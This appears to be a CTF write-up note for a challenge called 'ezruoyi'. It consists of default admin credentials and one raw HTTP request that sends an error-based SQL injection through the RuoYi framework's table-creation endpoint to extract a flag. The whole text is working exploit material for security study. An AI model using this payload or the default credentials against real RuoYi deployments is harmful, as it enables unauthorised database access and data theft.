---
tags: [SQL注入, RuoYi框架, 漏洞利用]
---

# ezruoyi

```
admin/admin123

POST /tool/gen/createTable HTTP/1.1
Host: 140.210.213.129:8899
Content-Length: 112
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://140.210.213.129:8899
Referer: http://140.210.213.129:8899/tool/gen/createTable
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=9ee4f071-0a2a-493a-be42-d91eafed2a80
Connection: close

sql=CREATE TABLE zzzzzz AS SELECT/**/1 where 1=extractvalue(1, concat(0x5c,
(select/**/flag from flag limit 1)));
```

